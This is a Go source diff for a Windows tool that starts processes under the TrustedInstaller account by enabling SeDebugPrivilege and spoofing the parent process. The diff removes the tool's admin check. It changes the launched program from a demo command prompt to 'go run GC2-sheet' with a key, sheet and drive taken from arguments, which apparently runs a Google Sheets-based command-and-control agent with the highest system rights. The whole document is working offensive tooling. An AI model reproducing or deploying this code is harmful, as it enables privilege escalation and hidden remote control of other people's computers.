@@ -2,7 +2,9 @@ package main
 
 import (
 	"fmt"
+	"os"
 	"os/exec"
+	"path/filepath"
 	"syscall"
 
 	"golang.org/x/sys/windows/svc"
@@ -17,12 +19,9 @@ const (
 	tiExecutableName = "trustedinstaller.exe"
 )
 
+var args []string = os.Args[1:]
+
 func RunAsTrustedInstaller(path string, args []string) error {
-	if !checkIfAdmin() {
-		if err := elevate(); err != nil {
-			return fmt.Errorf("cannot elevate Privs: %v", err)
-		}
-	}
 
 	if err := enableSeDebugPrivilege(); err != nil {
 		return fmt.Errorf("cannot enable %v: %v", seDebugPrivilege, err)
@@ -61,11 +60,33 @@ func RunAsTrustedInstaller(path string, args []string) error {
 		return fmt.Errorf("cannot open ti process: %v", err)
 	}
 
+    // Find the current user's Go bin path
+    userHome := os.Getenv("USERPROFILE")
+    goBinPath := filepath.Join(userHome, "go", "go", "bin")
+
+    // Full path to the other Go program
+    newDir := filepath.Join(userHome, "Downloads", "master", "GC2-sheet-Scripted-master")
+
+    // Change the current working directory to the new directory
+    if err := os.Chdir(newDir); err != nil {
+        return fmt.Errorf("Error changing directory: %v", err)
+    }
+
 	cmd := exec.Command(path, args...)
 	cmd.SysProcAttr = &syscall.SysProcAttr{
 		CreationFlags: windows.CREATE_NEW_CONSOLE,
 		ParentProcess: syscall.Handle(hand),
 	}
+
+	// Determine the appropriate path separator for the current OS
+    pathSeparator := string(os.PathListSeparator)
+
+    // Construct the new PATH environment variable
+    currentPath := os.Getenv("PATH")
+    newPath := fmt.Sprintf("%s%s%s", goBinPath, pathSeparator, currentPath)
+
+    // Set the PATH environment variable for this command
+    cmd.Env = append(os.Environ(), fmt.Sprintf("PATH=%s", newPath))
 
 	err = cmd.Start()
 	if err != nil {
@@ -77,7 +98,7 @@ func RunAsTrustedInstaller(path string, args []string) error {
 }
 
 func main() {
-	if err := RunAsTrustedInstaller("cmd.exe", []string{"/c", "start", "cmd.exe"}); err != nil {
+	if err := RunAsTrustedInstaller("go", []string{"run", "GC2-sheet", "-k", args[0], "-s", args[1], "-d", args[2]}); err != nil {
 		panic(err)
 	}
 }
